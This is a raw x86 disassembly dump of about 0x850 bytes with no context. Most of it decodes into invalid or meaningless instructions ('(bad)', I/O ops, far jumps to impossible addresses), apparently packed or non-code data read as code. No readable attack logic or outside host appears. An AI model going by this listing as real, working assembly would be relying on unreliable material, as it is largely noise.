  415822:	rol    BYTE PTR [esi+0xa],0xff
  415826:	stc    
  415827:	and    bl,BYTE PTR ss:[esi+0x500932eb]
  41582e:	rcl    WORD PTR [ecx],0x4f
  415832:	pop    esi
  415833:	ret    
  415834:	add    eax,0x92de968
  415839:	add    cl,al
  41583b:	xor    al,BYTE PTR ds:0x745ae900
  415841:	add    ch,cl
  415843:	xor    bh,dh
  415845:	mov    edi,0x44430bbd
  41584a:	sub    eax,0xe9000932
  41584f:	mov    ecx,0x88b9fbc4
  415854:	or     DWORD PTR [eax-0x15],ebp
  415857:	add    BYTE PTR [edi],bh
  415859:	xchg   ebp,eax
  41585a:	test   DWORD PTR [ebx-0x128df5ce],0xb283f51f
  415864:	cmc    
  415865:	or     DWORD PTR [ecx],ecx
  415867:	sub    DWORD PTR [esi+0x4a74feff],esp
  41586d:	and    al,BYTE PTR [esi+edi*8+0x19ea0b3d]
  415874:	inc    esp
  415875:	xchg   ebp,eax
  415876:	test   ecx,0xcefef2b8
  41587c:	in     al,0x9
  41587e:	sub    BYTE PTR ds:0x35bd4442,ch
  415885:	or     DWORD PTR [eax],eax
  415887:	jmp    0x1a3d1d3b
  41588c:	fwait
  41588d:	or     DWORD PTR [eax-0x15],ebp
  415890:	xchg   ebp,eax
  415891:	lahf   
  415892:	call   FWORD PTR [ebp-0x300fa40]
  415898:	(bad)  
  415899:	mov    esi,0x4939e940
  41589e:	push   cs
  41589f:	add    ah,dl
  4158a1:	popf   
  4158a2:	(bad)  
  4158a3:	dec    DWORD PTR [eax-0x34]
  4158a6:	inc    ebx
  4158a7:	fsubr  DWORD PTR [eax+0x5]
  4158aa:	add    BYTE PTR [eax],al
  4158ac:	xlat   BYTE PTR ds:[ebx]
  4158ad:	enter  0x1d9,0x18
  4158b1:	or     eax,0x8fbff00
  4158b6:	pop    DWORD PTR [ebp+0x68]
  4158b9:	push   ds
  4158ba:	jb     0x4158c4
  4158bc:	add    BYTE PTR [edi-0x38],ch
  4158bf:	loope  0x415888
  4158c1:	aad    0x34
  4158c3:	std    
  4158c4:	dec    DWORD PTR [eax]
  4158c6:	or     eax,0xd6c45c5
  4158cb:	add    BYTE PTR [eax],al
  4158cd:	fadd   DWORD PTR [ebp+0x44]
  4158d0:	lock fmul DWORD PTR [eax+eax*1]
  4158d4:	add    BYTE PTR [edi],dl
  4158d6:	enter  0xf1,0xc8
  4158da:	or     al,0x0
  4158dc:	lea    edx,[ebp+0x45ff4d44]
  4158e2:	and    ch,ah
  4158e4:	in     eax,0xcb
  4158e6:	or     al,0x0
  4158e8:	or     ecx,DWORD PTR [eax]
  4158ea:	cdq    
  4158eb:	adc    eax,0xfd181d83
  4158f0:	jae    0x415893
  4158f2:	sbb    eax,0x70ff474
  4158f7:	mov    ah,0x48
  4158f9:	dec    ecx
  4158fa:	or     eax,0xbc445c5
  4158ff:	add    BYTE PTR [eax],al
  415901:	cwde   
  415902:	xor    DWORD PTR [esi],eax
  415904:	(bad)  
  415905:	push   ebp
  415906:	cmp    ebp,edi
  415908:	dec    DWORD PTR [eax-0x638a02f4]
  41590e:	sbb    eax,0xcc237814
  415913:	std    
  415914:	or     cl,BYTE PTR [eax+0x31e81b98]
  41591a:	aam    0x1a
  41591c:	dec    BYTE PTR [esi+0x73]
  41591f:	(bad)  
  415920:	outs   dx,DWORD PTR ds:[esi]
  415921:	add    dl,bh
  415923:	xor    BYTE PTR [eax+eax*1],al
  415926:	vunpcklps ymm2,ymm2,YMMWORD PTR [ecx+eax*8]
  41592b:	sub    al,cl
  41592d:	push   edi
  41592f:	in     al,dx
  415930:	dec    ebx
  415931:	inc    edi
  415932:	jo     0x415926
  415934:	add    al,BYTE PTR [eax]
  415936:	xor    DWORD PTR [edx-0x80],esi
  415939:	jl     0x415938
  41593b:	icebp  
  41593c:	lea    ecx,[edx]
  41593e:	push   cs
  41593f:	fisttp QWORD PTR ds:0x294e7cfe
  415945:	mov    esi,DWORD PTR [edx]
  415947:	repnz add edi,edi
  41594a:	jl     0x41598a
  41594c:	sub    DWORD PTR [ebx+0x30],esi
  41594f:	repnz add esp,edi
  415952:	and    dh,BYTE PTR [edx]
  415954:	pop    edx
  415955:	(bad)  
  415956:	fisub  WORD PTR [esi]
  415958:	adc    al,0xf1
  41595a:	xchg   ecx,ebx
  41595c:	cld    
  41595d:	push   cs
  41595e:	mov    ah,0xd3
  415960:	adc    al,0xfe
  415962:	(bad)  
  415963:	jp     0x41595d
  415965:	or     bl,dl
  415967:	idiv   BYTE PTR [esi+0x66]
  41596a:	mov    bh,0xfe
  41596c:	adc    DWORD PTR [edi+0x1f230],esi
  415972:	push   es
  415973:	dec    ebx
  415974:	cmp    eax,edx
  415976:	add    al,0x7b
  415978:	and    BYTE PTR [edx+0x57b4dd6d],al
  41597e:	sbb    DWORD PTR ds:0xca314104,eax
  415984:	xchg   esi,eax
  415985:	add    BYTE PTR [eax],al
  415987:	jb     0x41594f
  415989:	sahf   
  41598a:	dec    DWORD PTR [esi+0x31000671]
  415990:	retf   0x20d2
  415993:	data16 or BYTE PTR [esi-0x6102a2e4],ah
  41599a:	adc    ecx,DWORD PTR [esi-0x2a]
  41599d:	into   
  41599e:	adc    cl,BYTE PTR [edi-0x10]
  4159a1:	(bad)  
  4159a2:	jmp    0x4159eb
  4159a4:	pop    es
  4159a5:	repz inc ebx
  4159a7:	ret    0x8f1b
  4159aa:	sub    eax,0xff77080e
  4159af:	out    dx,al
  4159b0:	jge    0x415993
  4159b2:	dec    edx
  4159b3:	sub    eax,0x1ec4b478
  4159b8:	or     ah,bh
  4159ba:	add    esi,DWORD PTR [ecx]
  4159bc:	jno    0x4159a6
  4159be:	add    al,0x31
  4159c0:	or     DWORD PTR [edi],edi
  4159c2:	ret    0x61c
  4159c5:	inc    edi
  4159c6:	addr16 enter 0xa87a,0x3
  4159cb:	out    dx,al
  4159cc:	dec    esp
  4159cd:	xor    eax,DWORD PTR ds:0x80e70930
  4159d3:	ins    DWORD PTR es:[edi],dx
  4159d4:	add    eax,0xb32512b8
  4159d9:	call   0x3105:0x8feed6c4
  4159e0:	or     edx,esp
  4159e2:	inc    ebx
  4159e3:	cmp    eax,0x88d9061c
  4159e8:	jp     0x415992
  4159ea:	add    eax,DWORD PTR [eax]
  4159ec:	leave  
  4159ed:	adc    al,0xdd
  4159ef:	adc    ch,BYTE PTR [edi+0x235de4ce]
  4159f5:	dec    eax
  4159f6:	out    0x3,eax
  4159f8:	xor    DWORD PTR [ecx],ecx
  4159fa:	out    0x1b,eax
  4159fc:	hlt    
  4159fd:	and    al,0xd6
  4159ff:	adc    dl,BYTE PTR [esi-0x78ed0fbc]
  415a05:	jno    0x415a24
  415a07:	retf   
  415a08:	icebp  
  415a09:	or     bh,cl
  415a0b:	cmp    DWORD PTR [ebp+0x6],edi
  415a0e:	add    DWORD PTR [esi+0x6253cb2d],esi
  415a14:	inc    esi
  415a15:	push   esi
  415a16:	pop    eax
  415a17:	adc    edi,esi
  415a19:	pop    es
  415a1a:	aas    
  415a1b:	jmp    0xaa40d24a
  415a20:	and    esi,DWORD PTR [eax+0x0]
  415a23:	sub    ebp,0xeae90008
  415a29:	add    eax,0xd032e9fe
  415a2e:	ret    0x32ed
  415a31:	pop    ecx
  415a32:	pop    eax
  415a33:	add    DWORD PTR [ebx+0x8],esp
  415a36:	aas    
  415a37:	jmp    0x2a40d266
  415a3c:	inc    ebx
  415a3d:	outs   dx,BYTE PTR ds:[esi]
  415a3e:	mov    cl,0xeb
  415a40:	cmc    
  415a41:	add    eax,0x92d81e6
  415a46:	add    BYTE PTR [ecx+0x10],dl
  415a49:	pop    es
  415a4a:	(bad)  
  415a4b:	sbb    dl,BYTE PTR ds:[ecx-0xd]
  415a4f:	add    BYTE PTR ss:[ebx-0x12],al
  415a53:	in     eax,dx
  415a54:	ss inc ebx
  415a56:	pop    es
  415a57:	jmp    0xfe48849c
  415a5c:	push   0x1
  415a5e:	jns    0x415aab
  415a60:	test   al,0x32
  415a62:	or     DWORD PTR [eax+esi*8-0x51],esi
  415a66:	inc    esp
  415a67:	jo     0x415a1b
  415a69:	cmc    
  415a6a:	add    eax,0x62875fe
  415a6f:	adc    al,0x79
  415a71:	out    dx,eax
  415a72:	dec    eax
  415a73:	add    BYTE PTR [esi],ah
  415a75:	cmp    DWORD PTR [edi+0x8352848],edi
  415a7b:	add    cl,ch
  415a7d:	mov    dl,0xed
  415a7f:	adc    eax,0xe90720d5
  415a84:	repz aaa 
  415a86:	pop    es
  415a87:	inc    BYTE PTR [eax]
  415a89:	retf   
  415a8a:	mov    esp,0xc7d6855
  415a8f:	aas    
  415a90:	add    BYTE PTR [eax-0x683cff62],ah
  415a96:	and    al,0x35
  415a98:	add    DWORD PTR [eax+0x9],ecx
  415a9b:	mov    bh,0x7
  415a9d:	dec    eax
  415a9e:	or     DWORD PTR [eax],eax
  415aa0:	xor    ecx,DWORD PTR [edx-0x5d7c0fe1]
  415aa6:	or     eax,0xea30273
  415aab:	jmp    0xfecafb99
  415ab0:	jmp    DWORD PTR [edi+0xfa7225]
  415ab6:	xchg   edi,eax
  415ab7:	sbb    ah,BYTE PTR [edi+0x0]
  415aba:	and    ah,0x0
  415abd:	add    BYTE PTR [eax],cl
  415abf:	inc    ebp
  415ac0:	(bad)  
  415ac1:	and    eax,0x408828
  415ac6:	ja     0x415ab4
  415ac8:	xor    DWORD PTR [ecx+0x25fd08c9],eax
  415ace:	xor    BYTE PTR [eax-0x13d8ffc0],cl
  415ad4:	cmp    DWORD PTR [ecx+0x25fd0899],eax
  415ada:	mov    BYTE PTR [edi-0x13c8ffc0],al
  415ae0:	inc    ecx
  415ae1:	sbb    DWORD PTR [ecx-0x6fda02f8],0x37004087
  415aeb:	in     al,dx
  415aec:	dec    ecx
  415aed:	or     DWORD PTR [ecx-0x37da02f8],0x97004087
  415af7:	jmp    0x415b4a
  415af9:	or     DWORD PTR [ecx+0xd],0x87f025fd
  415b00:	inc    eax
  415b01:	add    BYTE PTR [ecx],dh
  415b03:	(bad)  
  415b05:	pop    ebx
  415b06:	mov    al,0x31
  415b08:	add    al,0xff
  415b0a:	push   esp
  415b0b:	push   edx
  415b0c:	add    DWORD PTR [eax+0x31],0xb063e6c3
  415b13:	xor    DWORD PTR [edi+edi*8],eax
  415b16:	or     al,0x4a
  415b18:	add    DWORD PTR [eax+0x0],0x6be6ab31
  415b1f:	mov    al,0x31
  415b21:	add    al,0xff
  415b23:	adc    al,0x22
  415b25:	add    DWORD PTR [eax+0x31],0xb073e693
  415b2c:	xor    DWORD PTR [edi+edi*8],eax
  415b2f:	or     al,0xa
  415b31:	add    DWORD PTR [eax+0x31],0xb07be67b
  415b38:	xor    BYTE PTR [edi+edi*8],al
  415b3b:	push   esp
  415b3c:	jb     0x415ac0
  415b3e:	inc    eax
  415b3f:	xor    DWORD PTR [ebx-0x1a],esp
  415b42:	xor    DWORD PTR [eax+0x4cff01b0],0x6a
  415b49:	add    BYTE PTR [eax+0x31],0x4b
  415b4d:	out    0x8b,al
  415b4f:	mov    al,0xb0
  415b51:	add    edi,edi
  415b53:	adc    al,0x62
  415b55:	add    BYTE PTR [eax+0x31],0x33
  415b59:	out    0x93,al
  415b5b:	mov    al,0xb0
  415b5d:	add    edi,edi
  415b5f:	or     al,0x8a
  415b61:	add    BYTE PTR [eax+0x31],0x1b
  415b65:	out    0x9b,al
  415b67:	mov    al,0xb0
  415b69:	add    edi,edi
  415b6b:	adc    al,0x52
  415b6d:	add    BYTE PTR [eax+0x31],0x3
  415b71:	in     al,0xa3
  415b73:	mov    al,0xb0
  415b75:	add    edi,edi
  415b77:	dec    esp
  415b78:	dec    edx
  415b79:	add    BYTE PTR [eax+0x31],0x9
  415b7d:	out    0xe9,al
  415b7f:	add    dl,cl
  415b81:	mov    DWORD PTR [eax],ebp
  415b83:	add    al,0x8e
  415b85:	sub    eax,0x8f18597
  415b8a:	into   
  415b8b:	jmp    0x469e552
  415b90:	jbe    0x415bbf
  415b92:	jg     0x415b19
  415b94:	icebp  
  415b95:	or     BYTE PTR [esi+0x2889aae9],dh
  415b9b:	add    al,0x5e
  415b9d:	sub    eax,0x8f185a7
  415ba2:	sahf   
  415ba3:	jmp    0x469e51a
  415ba8:	inc    esi
  415ba9:	sub    eax,0x8f1859f
  415bae:	xchg   cl,ch
  415bb0:	push   0xffffff89
  415bb2:	sub    BYTE PTR [esi+ebp*1],al
  415bb5:	sub    eax,0x9718597
  415bba:	outs   dx,BYTE PTR ds:[esi]
  415bbb:	jmp    0x3e9e4c2
  415bc0:	push   ss
  415bc1:	sub    eax,0x971853f
  415bc6:	push   esi
  415bc7:	jmp    0x3e9e4b6
  415bcc:	(bad)  
  415bcd:	sub    al,0x47
  415bcf:	test   DWORD PTR [ecx+0x9],esi
  415bd2:	ds jmp 0x3e9e4aa
  415bd8:	out    0x2c,al
  415bda:	aas    
  415bdb:	test   DWORD PTR [ecx+0x9],esi
  415bde:	es jmp 0x3e9e4ae
  415be4:	add    dh,cl
  415be6:	sub    al,0x17
  415be8:	test   DWORD PTR [ecx+0x9],esi
  415beb:	push   cs
  415bec:	jmp    0x3e9e4b3
  415bf1:	mov    dh,0x2c
  415bf3:	inc    DWORD PTR [ecx+esi*8-0x6609fff8]
  415bfa:	(bad)  
  415bfb:	jg     0x415ba5
  415bfd:	xor    al,BYTE PTR [edx]
  415bff:	and    al,0xed
  415c01:	mov    al,0x49
  415c03:	add    dh,bl
  415c05:	cdq    
  415c06:	or     al,BYTE PTR [edx+0x24022d28]
  415c0c:	fnsave [eax-0x7639ffb7]
  415c12:	adc    al,BYTE PTR [edx+0x24023528]
  415c18:	fnsave [eax+0x49ae0049]
  415c1e:	sbb    al,BYTE PTR [edx+0x24022d28]
  415c24:	leave  
  415c25:	mov    al,0x49
  415c27:	add    BYTE PTR [esi+0x28822a59],dl
  415c2d:	xor    eax,0xb0d52402
  415c32:	dec    ecx
  415c33:	add    BYTE PTR [esi+0x19],bh
  415c36:	xor    al,BYTE PTR [edx+0x24022d28]
  415c3c:	mov    ch,0xb0
  415c3e:	dec    eax
  415c3f:	add    BYTE PTR [esi+0x9],ah
  415c42:	cmp    al,BYTE PTR [edx+0x240232a8]
  415c48:	adc    eax,0x48b300
  415c4d:	dec    esi
  415c4e:	or     DWORD PTR [edx-0x7e],eax
  415c51:	test   al,0x32
  415c53:	add    ah,BYTE PTR [eiz*4+0x360048b0]
  415c5a:	(bad)  [ecx-0x7e]
  415c5d:	test   al,0x32
  415c5f:	add    ah,BYTE PTR [esi*4+0x1e0048b0]
  415c66:	fst    DWORD PTR [ecx-0x7e]
  415c69:	test   al,0x32
  415c6b:	add    ah,BYTE PTR [ecx+esi*4]
  415c6e:	mov    al,0x48
  415c70:	add    BYTE PTR [eax],al
  415c72:	das    
  415c73:	icebp  
  415c74:	pop    ebp
  415c75:	sbb    cl,0x5
  415c78:	std    
  415c79:	and    eax,0x4087b4
  415c7e:	(bad)
  415c82:	dec    ecx
  415c83:	or     eax,0x86e825fd
  415c88:	inc    eax
  415c89:	add    BYTE PTR [edi-0x17],bl
  415c8c:	jno    0x415c10
  415c8e:	dec    ecx
  415c8f:	or     eax,0x86f025fd
  415c94:	inc    eax
  415c95:	add    BYTE PTR [edi+0x198279e9],ch
  415c9b:	or     eax,0x86c825fd
  415ca0:	inc    eax
  415ca1:	add    BYTE PTR [edi+0x198285e9],cl
  415ca7:	or     eax,0x86cc25fd
  415cac:	inc    eax
  415cad:	add    BYTE PTR [eax],al
  415caf:	scas   eax,DWORD PTR es:[edi]
  415cb0:	jmp    0xd4adf42
  415cb5:	std    
  415cb6:	and    eax,0x408b84
  415cbb:	lahf   
  415cbc:	call   0x58adf56
  415cc1:	std    
  415cc2:	and    eax,0x408bac
  415cc7:	outs   dx,DWORD PTR ds:[esi]
  415cc8:	call   0xd1adf6a
  415ccd:	std    
  415cce:	and    eax,0x408bb4
  415cd3:	outs   dx,DWORD PTR ds:[esi]
  415cd4:	call   0xcdadf7e
  415cd9:	std    
  415cda:	and    eax,0x408bac
  415cdf:	psubsb mm6,QWORD PTR [ecx-0x2f3767e]
  415ce6:	and    eax,0x408b50
  415ceb:	xor    DWORD PTR [ebx-0x38],ebp
  415cee:	and    esi,DWORD PTR ds:0x34010c73
  415cf4:	cli    
  415cf5:	dec    ecx
  415cf6:	arpl   WORD PTR [ecx],si
  415cf8:	repnz add edx,eax
  415cfb:	sub    eax,0x35f780f2
  415d00:	ins    DWORD PTR es:[edi],dx
  415d01:	stc    
  415d02:	mov    bh,0x33
  415d04:	repnz add DWORD PTR [eax],eax
  415d07:	jae    0x415cef
  415d09:	add    DWORD PTR [ebx+0x78eea89],eax
  415d0f:	mov    ecx,0x1e6
  415d14:	xor    DWORD PTR [ebp+eax*1-0xe354e00],esi
  415d1b:	jl     0x415d56
  415d1d:	jp     0x415d22
  415d1f:	add    BYTE PTR [ecx],dh
  415d21:	repnz aas 
  415d23:	add    esi,DWORD PTR [ecx]
  415d25:	jae    0x415d30
  415d27:	pop    ds
  415d28:	int3   
  415d29:	stc    
  415d2a:	dec    ecx
  415d2b:	pop    es
  415d2c:	xor    edx,esi
  415d2e:	add    edx,eax
  415d30:	xor    eax,0xf1f780f2
  415d35:	add    al,0xfc
  415d37:	mov    bh,0x3b
  415d39:	repnz add DWORD PTR [eax],eax
  415d3c:	repz in eax,dx
  415d3e:	add    DWORD PTR ds:0x1f1b1,edi
  415d44:	xchg   esp,eax
  415d45:	cli    
  415d46:	dec    ecx
  415d47:	or     esi,DWORD PTR [ecx]
  415d49:	repnz add edx,eax
  415d4c:	sub    eax,0x31ffcef2
  415d51:	repnz add DWORD PTR [ebp+0x29],edi
  415d55:	mov    bh,bl
  415d57:	(bad)  
  415d58:	out    dx,al
  415d59:	icebp  
  415d5a:	aas    
  415d5b:	add    esi,DWORD PTR [ecx]
  415d5d:	cmc    
  415d5e:	add    DWORD PTR [edx],eax
  415d60:	xor    edx,esi
  415d62:	mov    es,WORD PTR [edi]
  415d64:	cdq    
  415d65:	or     bh,dh
  415d67:	add    esi,DWORD PTR [ecx]
  415d69:	or     DWORD PTR [ecx],ebp
  415d6b:	pop    es
  415d6c:	xor    DWORD PTR [esi],edi
  415d6e:	out    0x7,eax
  415d70:	xor    DWORD PTR [ecx],ecx
  415d72:	mov    ebx,?
  415d74:	jle    0x415d90
  415d76:	out    0x3,eax
  415d78:	add    BYTE PTR [ecx],dh
  415d7a:	retf   
  415d7b:	jecxz  0x415d80
  415d7d:	fs or  edi,ebx
  415d80:	add    esi,DWORD PTR [ecx]
  415d82:	jle    0x415d63
  415d84:	dec    ebx
  415d85:	inc    edx
  415d86:	or     edi,esp
  415d88:	add    esi,DWORD PTR [ebx+0x4]
  415d8b:	out    0xc8,eax
  415d8d:	xchg   BYTE PTR [edi],cl
  415d8f:	out    0x3,eax
  415d91:	cld    
  415d92:	adc    BYTE PTR [edi-0x1800890e],cl
  415d98:	inc    ebp
  415d99:	xor    cl,BYTE PTR [ecx]
  415d9b:	cld    
  415d9c:	add    edx,DWORD PTR [ecx]
  415d9e:	or     edi,esp
  415da0:	mov    BYTE PTR [esi],dh
  415da2:	ror    edi,0x3
  415da5:	xor    DWORD PTR [ecx],ecx
  415da7:	test   eax,0xe73e3100
  415dac:	ret    
  415dad:	inc    esi
  415dae:	call   DWORD PTR [esp+edi*8]
  415db1:	xchg   BYTE PTR [edx],ah
  415db3:	out    0x3,eax
  415db5:	xor    ebx,ecx
  415db7:	jmp    0x415dbc
  415db9:	ins    BYTE PTR es:[edi],dx
  415dba:	or     DWORD PTR [edi+0x4],esp
  415dbd:	xor    DWORD PTR [edi+ebx*8+0x4b],edi
  415dc1:	cmp    cl,BYTE PTR [ecx]
  415dc3:	out    0x3,eax
  415dc5:	repz add eax,0x3cf9d6e7
  415dcb:	out    0x3,eax
  415dcd:	xor    BYTE PTR [ecx],cl
  415dcf:	out    0x68,al
  415dd1:	icebp  
  415dd2:	mov    WORD PTR [ebx+0x289214fc],ds
  415dd8:	inc    esi
  415dd9:	xor    cl,BYTE PTR [ecx]
  415ddb:	push   0xffffff85
  415ddd:	add    BYTE PTR [edx+0x5],cl
  415de0:	add    cl,ch
  415de2:	xor    bh,dh
  415de4:	jae    0x415db2
  415de6:	push   edi
  415de7:	mov    DWORD PTR [eax],edx
  415de9:	in     eax,dx
  415dea:	xor    cl,BYTE PTR [ecx]
  415dec:	xchg   DWORD PTR [eax-0x2b],ebp
  415def:	or     al,BYTE PTR [eax]
  415df1:	jmp    0xedc125e8
  415df6:	mov    dh,0xfe
  415df8:	std    
  415df9:	icebp  
  415dfa:	xor    cl,BYTE PTR [ecx]
  415dfc:	add    BYTE PTR [eax-0x54],dh
  415dff:	push   cs
  415e00:	add    al,0xe9
  415e02:	xor    cl,BYTE PTR [edx-0x1693a84]
  415e08:	mov    dh,BYTE PTR [eax-0x66]
  415e0b:	or     al,BYTE PTR [eax]
  415e0d:	jmp    0xe8cb71c8
  415e12:	xor    al,0xc9
  415e14:	(bad)  
  415e15:	test   eax,0xedc208fa
  415e1a:	xor    bl,cl
  415e1c:	pop    ds
  415e1d:	stos   DWORD PTR es:[edi],eax
  415e1e:	data16 inc BYTE PTR [edx+0xa5668]
  415e25:	jmp    0x725cd355
  415e2a:	mov    ch,0xe
  415e2c:	add    al,0xe9
  415e2e:	xor    dl,BYTE PTR [eax-0x1c10e81]
  415e34:	std    
  415e35:	sub    edx,esi
  415e37:	mov    BYTE PTR [ebp*8-0x16f7f6ce],bl
  415e3e:	xor    cl,BYTE PTR [ecx]
  415e40:	xchg   DWORD PTR [eax+0x0],ebp
  415e43:	and    cl,BYTE PTR [edx]
  415e45:	add    cl,ch
  415e47:	xchg   edi,eax
  415e48:	xchg   ecx,eax
  415e49:	sbb    ch,ch
  415e4b:	xor    cl,BYTE PTR [ecx]
  415e4d:	ror    BYTE PTR [eax],1
  415e4f:	outs   dx,BYTE PTR ds:[esi]
  415e50:	mov    edi,DWORD PTR [edi-0xb]
  415e53:	(bad)  
  415e54:	std    
  415e55:	std    
  415e56:	dec    esi
  415e57:	mov    eax,ds:0x5900891c
  415e5c:	cli    
  415e5d:	add    DWORD PTR [eax],eax
  415e5f:	fdivr  DWORD PTR [eax+eax*4+0x18]
  415e63:	int3   
  415e64:	or     DWORD PTR [eax],eax
  415e66:	inc    eax
  415e67:	jne    0xa196286
  415e6d:	or     BYTE PTR [eax],al
  415e6f:	fmul   DWORD PTR [ecx]
  415e71:	xchg   DWORD PTR [ecx-0x20248],eax
  415e77:	push   ebx
  415e78:	jge    0x415e8f
  415e7a:	add    al,0x98
  415e7c:	or     DWORD PTR [edx-0x4b665ff],ecx
  415e82:	rcl    BYTE PTR [eax],0x5
  415e85:	ror    DWORD PTR [ebx-0x74fe2234],0x4c
  415e8c:	jmp    0xb87fb392
  415e91:	xor    dh,dh
  415e93:	adc    eax,0x608afdc2
  415e98:	and    esi,0x1
  415e9b:	leave  
  415e9c:	sbb    al,0x43
  415e9e:	lea    edi,[eax+edi*4-0x7e]
  415ea2:	clc    
  415ea3:	dec    ecx
  415ea4:	cwde   
  415ea5:	in     eax,dx
  415ea6:	add    DWORD PTR [eax],0xffffff96
  415ea9:	or     DWORD PTR [ebx-0x1f06801],edi
  415eaf:	lea    esp,ds:0xfb727202
  415eb5:	jnp    0x415eb5
  415eb7:	add    ecx,esi
  415eb9:	lock add DWORD PTR [eax],eax
  415ebc:	sbb    BYTE PTR [eax+ebx*1+0x1f5998b],cl
  415ec3:	add    BYTE PTR [eax],cl
  415ec5:	add    BYTE PTR [eax+0x90c18],0x40
  415ecc:	adc    DWORD PTR [eax+0x19],0x87091804
  415ed3:	xor    DWORD PTR [ecx],0xf6fffe02
  415ed9:	adc    DWORD PTR [bx],0xf601f235
  415ee0:	repz icebp 
  415ee2:	lea    ecx,[ecx]
  415ee4:	stos   DWORD PTR es:[edi],eax
  415ee5:	fiadd  DWORD PTR [ebx]
  415ee7:	fcmovnbe st,st(7)
  415ee9:	das    
  415eea:	jl     0x415f03
  415eec:	(bad)  
  415eee:	xor    DWORD PTR [edi],ebx
  415ef0:	xor    BYTE PTR [ecx-0x18],bl
  415ef3:	add    esi,DWORD PTR [ecx]
  415ef5:	repnz mov ds,WORD PTR [eax]
  415ef8:	stos   BYTE PTR es:[edi],al
  415ef9:	jno    0x415eef
  415efb:	add    esi,DWORD PTR [ecx]
  415efd:	bnd jp 0x415e80
  415f00:	dec    ecx
  415f01:	out    0x1,al
  415f03:	add    cl,dh
  415f05:	push   0xf22d1b49
  415f0a:	add    DWORD PTR [ecx-0x1fd5000],ecx
  415f10:	inc    DWORD PTR [esi+0x35178277]
  415f16:	repnz add DWORD PTR [edx-0x2d30fe7],ecx
  415f1d:	jb     0x415ec0
  415f1f:	sbb    eax,DWORD PTR [edx+0x1779f157]
  415f25:	in     al,0x5f
  415f27:	lods   al,BYTE PTR ds:[esi]
  415f28:	add    BYTE PTR [eax+0x4efffdce],cl
  415f2e:	sbb    eax,0x2b08ae9
  415f33:	(bad)  
  415f34:	(bad)  
  415f35:	imul   eax,DWORD PTR ds:[edx+0x1f22d17],0xe548b840
  415f40:	add    esi,DWORD PTR [ecx]
  415f42:	bnd jp 0x415ec5
  415f45:	inc    ecx
  415f46:	out    dx,al
  415f47:	add    DWORD PTR [eax],eax
  415f49:	stos   BYTE PTR es:[edi],al
  415f4a:	jo     0x415f35
  415f4c:	add    esi,DWORD PTR [ecx]
  415f4e:	or     edi,esp
  415f50:	adc    eax,esi
  415f52:	or     ebx,edx
  415f54:	std    
  415f55:	test   al,0x18
  415f57:	jmp    0x60085391
  415f5c:	repz fild DWORD PTR [esi]
  415f5f:	pop    ss
  415f60:	jecxz  0x415f93
  415f62:	mov    dl,0xdb
  415f64:	(bad)  
  415f65:	fdivp  st(3),st
  415f67:	mov    esp,0xd789abea
  415f6c:	dec    esi
  415f6e:	sti    
  415f6f:	jo     0x415ef3
  415f71:	add    BYTE PTR [esi],bl
  415f73:	add    eax,0x927103e7
  415f78:	push   eax
  415f79:	out    0x32,eax
  415f7b:	or     edi,esp
  415f7d:	jp     0x415f30
  415f7f:	sbb    bl,ch
  415f81:	add    esi,DWORD PTR [ecx]
  415f83:	nop
  415f84:	jo     0x415f71
  415f86:	xor    cl,BYTE PTR [ecx]
  415f88:	out    0x33,eax
  415f8a:	push   ecx
  415f8b:	pop    esp
  415f8c:	lea    esp,[esi-0x4d18fb90]
  415f92:	fisttp QWORD PTR [edi+0x532ee04b]
  415f98:	sbb    al,BYTE PTR [edi+ebx*8-0x79]
  415f9c:	int3   
  415f9d:	mul    esp
  415f9f:	add    eax,0xfb66f784
  415fa4:	out    0x7a,eax
  415fa6:	fisub  DWORD PTR [ebx+ebx*8]
  415fa9:	jp     0x41600a
  415fab:	das    
  415fac:	mov    ah,0x79
  415fae:	shl    BYTE PTR [edi+eiz*8],cl
  415fb1:	jns    0x415fda
  415fb3:	test   edx,eax
  415fb5:	nop
  415fb6:	push   ds
  415fb7:	nop
  415fb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fb9:	jnp    0x416017
  415fbb:	lea    esi,[edx+0x4]
  415fbe:	xor    DWORD PTR [ecx],ecx
  415fc0:	out    0xc9,eax
  415fc2:	dec    eax
  415fc3:	jne    0x415faa
  415fc5:	mov    esp,0xa0008470
  415fca:	shl    ah,0x81
  415fcd:	test   eax,0xdcc7860e
  415fd2:	or     cl,BYTE PTR [eax+0x1b00ebc0]
  415fd8:	pop    es
  415fd9:	sub    DWORD PTR [ecx],0x6a4643f6
  415fdf:	leave  
  415fe0:	es sbb al,0xe8
  415fe3:	ror    esp,0x5d
  415fe6:	lahf   
  415fe7:	mov    DWORD PTR [edi-0x3e],ebx
  415fea:	in     eax,0x32
  415fec:	mov    ss,WORD PTR [ebp+eax*1+0x31]
  415ff0:	push   esp
  415ff1:	push   esi
  415ff2:	jb     0x416010
  415ff4:	ret    
  415ff5:	xchg   cl,dl
  415ff7:	mov    esi,0x32e9fdfa
  415ffc:	or     DWORD PTR [eax],eax
  415ffe:	arpl   WORD PTR [ebx+0x26f6c786],bp
  416004:	sub    bh,bh
  416006:	call   0x75cab23d
  41600b:	jbe    0x416023
  41600d:	sub    esi,0xa6037487
  416013:	jg     0x41600f
  416015:	std    
  416016:	jmp    0xae6b2816
  41601b:	add    al,BYTE PTR [eax+0x8]
  41601e:	push   ebp
  41601f:	stos   DWORD PTR es:[edi],eax
  416020:	dec    ebx
  416021:	inc    eax
  416022:	ins    BYTE PTR es:[edi],dx
  416023:	das    
  416024:	jne    0x41601c
  416026:	push   0xffffffdc
  416028:	sbb    eax,0xfa32e904
  41602d:	jae    0x415ffb
  41602f:	retf   
  416030:	adc    DWORD PTR [eax],0xffffffed
  416033:	xor    cl,BYTE PTR [ecx]
  416035:	xchg   DWORD PTR [edi+0x4a],esp
  416038:	push   es
  416039:	add    cl,ch
  41603b:	add    BYTE PTR [edx-0x3d],dh
  41603e:	xchg   ch,ch
  416040:	cs cli 
  416042:	std    
  416043:	add    BYTE PTR [eax],ah
  416045:	push   es
  416046:	add    BYTE PTR [eax],al
  416048:	mov    eax,ds:0x8040d7c
  41604d:	push   es
  41604e:	mov    DWORD PTR [esi-0x20620],eax
  416054:	dec    eax
  416055:	out    0x8a,al
  416057:	xchg   al,bh
  416059:	stc    
  41605a:	std    
  41605b:	call   DWORD PTR [edx-0x2f77a100]
  416061:	add    al,BYTE PTR [ebx+0x5d410]
  416067:	pop    esi
  416068:	mov    ebp,0x45000547
  41606d:	add    esi,DWORD PTR [ecx-0x48]
  416070:	pop    ebx
  416071:	cmp    eax,0xe23e01fe
  416076:	add    DWORD PTR [eax],eax
